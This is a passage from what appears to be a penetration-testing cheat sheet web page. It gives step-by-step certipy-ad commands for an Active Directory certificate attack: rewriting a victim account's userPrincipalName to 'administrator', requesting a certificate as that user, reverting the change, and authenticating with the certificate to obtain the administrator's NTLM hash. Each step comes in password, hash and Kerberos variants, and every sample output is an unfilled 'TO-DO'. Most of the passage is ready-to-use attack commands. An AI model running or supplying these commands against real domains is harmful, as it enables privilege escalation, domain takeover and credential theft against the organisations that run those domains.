TO-DO</div></pre></div><div class="highlight ticket-based-kerberos codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Ticket-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad account -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -k -target '<span class="o editable-keyword">&lt;DC&gt;</span>' -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -user '<span class="o editable-keyword">&lt;TARGET_USER&gt;</span>' read
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><h4 id="2-modify-target-users-userprincipalname-with-genericallgenericwrite">2. Modify Target Users userPrincipalName (With GenericAll/GenericWrite)</h4>
<div class="highlight password codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad account update -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -user <span class="o editable-keyword">&lt;TARGET_USER&gt;</span> -upn 'administrator'
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight ntlm codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad account update -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -hashes <span class="o editable-keyword">&lt;HASH&gt;</span> -user <span class="o editable-keyword">&lt;TARGET_USER&gt;</span> -upn 'administrator'
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight password-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad account update -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -k -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ns <span class="o editable-keyword">&lt;DC_IP&gt;</span> -user <span class="o editable-keyword">&lt;TARGET_USER&gt;</span> -upn 'administrator'
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight ntlm-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad account update -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -hashes <span class="o editable-keyword">&lt;HASH&gt;</span> -k -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ns <span class="o editable-keyword">&lt;DC_IP&gt;</span> -user <span class="o editable-keyword">&lt;TARGET_USER&gt;</span> -upn 'administrator'
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight ticket-based-kerberos codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Ticket-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad account update -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -k -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ns <span class="o editable-keyword">&lt;DC_IP&gt;</span> -user <span class="o editable-keyword">&lt;TARGET_USER&gt;</span> -upn 'administrator'
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><h4 id="3-request-a-cert-as-the-victim-from-any-suitable-client-authentication-template">3. Request a Cert as the Victim from Any Suitable Client Authentication Template</h4>
<div class="highlight password codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -template 'User'
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight ntlm codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -hashes '<span class="o editable-keyword">&lt;HASH&gt;</span>' -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -template 'User'
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight password-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -k -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ns <span class="o editable-keyword">&lt;DC_IP&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -template 'User'
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight ntlm-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -hashes '<span class="o editable-keyword">&lt;HASH&gt;</span>' -k -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ns <span class="o editable-keyword">&lt;DC_IP&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -template 'User'
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight ticket-based-kerberos codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Ticket-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -k -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ns <span class="o editable-keyword">&lt;DC_IP&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -template 'User'
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><h4 id="4-revert">4. Revert</h4>
<div class="highlight password codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad account update -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -user <span class="o editable-keyword">&lt;TARGET_USER&gt;</span> -upn '<span class="o editable-keyword">&lt;TARGET_USER_UPN&gt;</span>'
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight ntlm codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad account update -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -hashes <span class="o editable-keyword">&lt;HASH&gt;</span> -user <span class="o editable-keyword">&lt;TARGET_USER&gt;</span> -upn '<span class="o editable-keyword">&lt;TARGET_USER_UPN&gt;</span>'
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight password-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad account update -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -k -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ns <span class="o editable-keyword">&lt;DC_IP&gt;</span> -user <span class="o editable-keyword">&lt;TARGET_USER&gt;</span> -upn '<span class="o editable-keyword">&lt;TARGET_USER_UPN&gt;</span>'
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight ntlm-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad account update -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -hashes <span class="o editable-keyword">&lt;HASH&gt;</span> -k -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ns <span class="o editable-keyword">&lt;DC_IP&gt;</span> -user <span class="o editable-keyword">&lt;TARGET_USER&gt;</span> -upn '<span class="o editable-keyword">&lt;TARGET_USER_UPN&gt;</span>'
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight ticket-based-kerberos codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Ticket-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad account update -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -k -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ns <span class="o editable-keyword">&lt;DC_IP&gt;</span> -user <span class="o editable-keyword">&lt;TARGET_USER&gt;</span> -upn '<span class="o editable-keyword">&lt;TARGET_USER_UPN&gt;</span>'
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><h4 id="5-get-ntlm-hash">5. Get NTLM Hash</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">certipy-ad auth -pfx administrator.pfx -u 'administrator' -domain <span class="o editable-keyword">&lt;DOMAIN&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div></div></div><p></p>
<hr>
<h3 id="workaround-kerberos-sessionerror-kdc_err_padata_type_nosupp">Workaround: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP</h3>
<h4 id="1-create-key-and-cert-from-pfx">1. Create Key and Cert from pfx</h4>
